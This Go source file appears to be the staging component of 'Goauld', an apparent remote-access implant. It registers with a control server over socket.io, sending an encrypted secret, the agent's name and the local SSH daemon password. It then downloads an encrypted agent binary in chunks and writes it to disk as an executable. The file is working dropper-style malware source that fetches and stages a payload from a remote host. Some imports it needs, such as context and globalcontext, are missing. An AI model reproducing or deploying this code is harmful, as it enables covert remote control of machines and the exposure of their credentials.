//go:build mini

package control

import (
	"Goauld/agent/chunkAgent"
	"Goauld/agent/config"
	"Goauld/common/crypto"
	"Goauld/common/log"
	"fmt"
	"os"
	"path/filepath"
	"time"

	socketio "Goauld/common/socket.io"
	sio "github.com/hazegard/socket.io-go"
)

// ControlPlanClient Handle the socket.io interaction regarding the management of the agent.
//
//nolint:revive
type ControlPlanClient struct {
	manager      *sio.Manager
	socket       sio.ClientSocket
	configDone   chan<- string
	ctx          context.Context
	url          string
	canceler     *globalcontext.GlobalCanceler
	errorCounter int
}

func AddHandlers(socket sio.ClientSocket, cpc *ControlPlanClient) {}

// Start starts the socket and initiates the configuration exchange with the server.
func (cpc *ControlPlanClient) Start() error {
	encryptedKey, err := crypto.AsymEncrypt(config.Get().AgePubKey(), config.Get().SharedSecret)
	if err != nil {
		return fmt.Errorf("error encrypting shared secret: %w", err)
	}

	encryptedName, err := crypto.AsymEncrypt(config.Get().AgePubKey(), config.Get().Name())
	if err != nil {
		return fmt.Errorf("error encrypting shared secret: %w", err)
	}

	cryptor, err := crypto.NewCryptor(config.Get().SharedSecret)
	if err != nil {
		return fmt.Errorf("error encrypting shared secret: %w", err)
	}

	agentData, err := socketio.NewEncryptedAgentSSHPasswordMessage(config.Get(), cryptor)
	if err != nil {
		log.Error().Err(err).Msgf("Error encrypting local sshd password")
	}

	cr := &chunkAgent.ChunkedReconstructor{}
	cpc.socket.OnEvent(socketio.ReceiveFatAgent.ID(), func(data sio.Binary) {
		log.Info().Msgf("Received chunked reconstructor data: (%d bytes)", len(data))
		binary, err := socketio.DecryptChunkedData(data, config.Get().Cryptor)
		if err != nil {
			log.Error().Err(err).Msg("Error decrypting chunked data")
		} else {
			log.Info().Int("Id", binary.Chunk).Int("Last", binary.LastChunk).Msgf("Received chunked")
			if cr.AddChunk(binary) {
				d := cr.Rebuild()
				fmt.Println(len(d))
				goauld, err := drop(d)
				if err != nil {
					log.Error().Err(err).Msg("Error dropping goauld agent")
					cpc.canceler.Exit("Error dropping goauld agent")
					return
				}
				cpc.configDone <- goauld
			}
		}
	})

	// ExitEvent is sent by the server when the agent is requested to exit
	cpc.socket.OnEvent(socketio.ExitEvent.ID(), func(doExit bool) {
		log.Info().Msg("OnEvent: Exit requested")
		cpc.socket.Emit(socketio.ExitSuccess.ID())
		cpc.socket.Disconnect()
		if doExit {
			cpc.canceler.Exit("Server requested exit")
		}
		cpc.canceler.Restart("Server requested restart")
		cpc.Close()
	})

	// This will be emitted after the socket is connected.
	cpc.socket.Emit(socketio.RegisterEvent.ID(), socketio.Register{
		ID:        config.Get().ID,
		SharedKey: encryptedKey,
		Name:      encryptedName,
		Load:      true,
		AgentData: agentData,
	})

	cpc.socket.Connect()
	// starts the keepalive in the background
	//go cpc.keepAliveLoop(cpc.ctx)
	log.Debug().Msgf("Connected to the control server %s", cpc.url)
	log.Trace().Msg("Event send: RegisterEvent")
	// Waits for an error or the end of the socket
	select {
	case <-cpc.ctx.Done():
		log.Warn().Msgf("Shutting done the socketio control socket")
		cpc.socket.Emit(socketio.Disconnect.ID(), socketio.DisconnectMessage{})
		log.Trace().Msg("Event send: Disconnect")
		cpc.socket.Disconnect()
	case <-time.After(120 * time.Second):
		cpc.canceler.Restart("Timeout waiting for goauld binary")
	}

	return nil
}
func drop(binary []byte) (string, error) {
	wd, err := os.Getwd()
	if err != nil {
		wd = os.TempDir()
	}
	target := filepath.Join(wd, "goauld")
	err = os.WriteFile(target, binary, 0o755)
	if err != nil {
		return "", err
	}

	return target, nil
}
